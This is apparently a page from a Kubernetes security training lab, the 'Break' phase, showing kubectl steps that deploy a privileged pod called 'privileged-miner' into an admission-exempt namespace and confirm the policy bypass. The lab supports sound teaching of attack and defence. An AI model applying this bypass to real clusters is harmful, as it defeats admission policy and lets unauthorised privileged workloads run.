# Lab 5.5: Kubernetes Admission Controller Bypass

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Bypass via Exempt Namespace

### Step 1: Deploy the privileged pod into an exempt namespace

```bash
cat /app/exploits/exempt-namespace-pod.yaml
kubectl apply -f /app/exploits/exempt-namespace-pod.yaml
```

The privileged pod deploys in the exempt namespace. Admission controllers skip certain namespaces to avoid breaking system components.

```bash
kubectl get pod -n monitoring privileged-miner
kubectl exec -n monitoring privileged-miner -- whoami
kubectl exec -n monitoring privileged-miner -- cat /proc/1/status | head -5
```

### Step 2: Confirm why it worked

```bash
kubectl get config.config.gatekeeper.sh -n gatekeeper-system -o yaml 2>/dev/null
kubectl get validatingwebhookconfigurations -o yaml | grep -A 5 "namespaceSelector"
```

The policy is not weak in general. It simply never ran for the exempt namespace.

### Impact

```bash
kubectl get pods --all-namespaces -o wide | grep privileged-miner
```

One privileged workload is enough. Once a supposedly protected cluster has even one exempt namespace, the policy guarantee is gone.

!!! info "Related Variants"
    Other admission-controller gaps exist, including uncovered CRDs and post-admission mutations. They matter, but they are not the mainline attack in this lab.

> **Checkpoint:** You should have one privileged pod, `privileged-miner`, running in the exempt `monitoring` namespace.
